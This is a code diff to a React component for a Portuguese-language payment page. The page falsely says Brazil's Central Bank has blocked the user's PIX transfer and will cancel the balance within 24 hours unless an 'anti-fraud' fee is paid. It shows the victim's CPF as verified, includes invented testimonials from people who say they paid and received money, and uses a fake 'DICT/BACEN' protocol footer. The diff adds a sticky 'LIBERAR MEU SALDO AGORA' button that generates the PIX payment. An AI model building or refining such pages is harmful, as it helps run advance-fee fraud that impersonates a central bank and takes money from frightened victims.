@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
+import StickyCtaBar from "./StickyCtaBar";
 import pixLogo from "@/assets/pix-logo.svg";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
@@ -29,7 +30,7 @@ const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf,
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
       <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">⚠️ TRANSFERÊNCIA BLOQUEADA PELO BACEN</h1></div>
-      <main className="px-3 py-4 max-w-lg mx-auto">
+      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
         {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
         <div className="bg-red-50 border border-red-300 rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⛔</span><div><p className="text-red-700 text-xs font-bold mb-1">SALDO SERÁ CANCELADO EM 24H</p><p className="text-red-600 text-[11px] leading-relaxed">O <span className="font-bold">Banco Central</span> bloqueou sua transferência de <span className="font-bold">{balance}</span> por suspeita de fraude. Sem a verificação anti-fraude, o valor será <strong>devolvido ao remetente e você perde o saldo permanentemente</strong>.</p></div></div></div>
         <div className="bg-red-50/50 rounded-xl p-4 mb-3 border border-red-200"><p className="text-red-700 text-xs font-bold mb-2">🚨 Sem a verificação anti-fraude:</p><div className="space-y-1.5"><p className="text-red-600 text-[11px]">❌ Saldo de <strong>{balance} CANCELADO</strong> permanentemente</p><p className="text-red-600 text-[11px]">❌ CPF <strong>marcado como suspeito</strong> no sistema DICT/BACEN</p><p className="text-red-600 text-[11px]">❌ <strong>Impossível recuperar</strong> o valor após cancelamento</p><p className="text-red-600 text-[11px]">❌ Futuras transferências PIX <strong>bloqueadas por até 180 dias</strong></p></div></div>
@@ -47,6 +48,7 @@ const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf,
         <div className="mt-3 space-y-2.5"><p className="text-gray-600 text-xs font-bold text-center">Quem já recebeu:</p><TestimonialCard avatar={testimonial1} name="Mariana S." location="São Paulo, SP" time="há 12 min" text="Eu achei que era golpe, mas paguei a tarifa e em menos de 2 minutos o PIX de R$ 3.241,00 caiu na minha conta." amount="R$ 3.241,00" /><TestimonialCard avatar={testimonial2} name="Carlos A." location="Belo Horizonte, MG" time="há 38 min" text="Fiquei com medo no início, mas vi que era protocolo do Banco Central mesmo. Paguei e recebi meu saldo inteiro." amount="R$ 2.876,50" /><TestimonialCard avatar={testimonial3} name="Fernanda L." location="Rio de Janeiro, RJ" time="há 1h" text="Quase desisti achando que ia perder dinheiro. Mas a tarifa voltou certinho e meu saldo caiu rapidinho." amount="R$ 2.654,30" /></div>
         <p className="text-gray-400 text-[10px] text-center mt-4 pb-6">© 2025 Sistema de Verificação Bancária. Protocolo DICT/BACEN.</p>
       </main>
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="LIBERAR MEU SALDO AGORA" bgColor="bg-[#00A651]" shadowColor="shadow-green-200" />
     </div>
   );
 };
